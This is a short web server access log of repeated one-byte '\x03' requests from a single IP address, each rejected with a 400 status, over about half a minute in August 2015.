201.231.146.184 - - [29/Aug/2015:19:28:16 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:17 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:18 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:18 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:19 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:19 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:20 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:21 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:21 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:22 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:22 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:23 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:24 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:24 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:25 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:26 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:26 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:27 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:27 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:28 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:29 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:29 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:30 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:30 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:31 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:32 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:32 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:33 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:34 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:34 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:35 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:36 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:37 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:38 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:38 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:39 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:40 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:40 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:41 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:41 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:42 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:43 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:44 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:45 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:46 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:46 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:47 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:48 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:48 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:49 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:49 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:50 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:51 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:51 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:52 +0200] "\x03" 400 0 "-" "-"
201.231.146.184 - - [29/Aug/2015:19:28:52 +0200] "\x03" 400 0 "-" "-"
